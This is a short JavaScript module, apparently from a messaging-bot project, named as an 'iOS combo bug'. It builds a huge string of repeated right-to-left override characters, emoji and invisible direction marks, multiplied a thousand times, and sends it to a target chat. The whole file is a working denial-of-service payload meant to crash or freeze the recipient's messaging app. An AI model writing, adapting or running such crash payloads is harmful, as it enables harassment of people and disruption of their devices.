// bugs/ios-combo-bug.js

module.exports = async (bot, jid) => {
  const directionalCrash = '\u202e'.repeat(300);
  const emojiBomb = '💥🔥👹💀👺💣👾⚡🧨🕳️🌀'.repeat(100);
  const invisible = '\u200E'.repeat(600); // invisible character U+200E

  const fullBug = (directionalCrash + emojiBomb + invisible).repeat(1000);

  await bot.sendMessage(jid, { text: fullBug });
};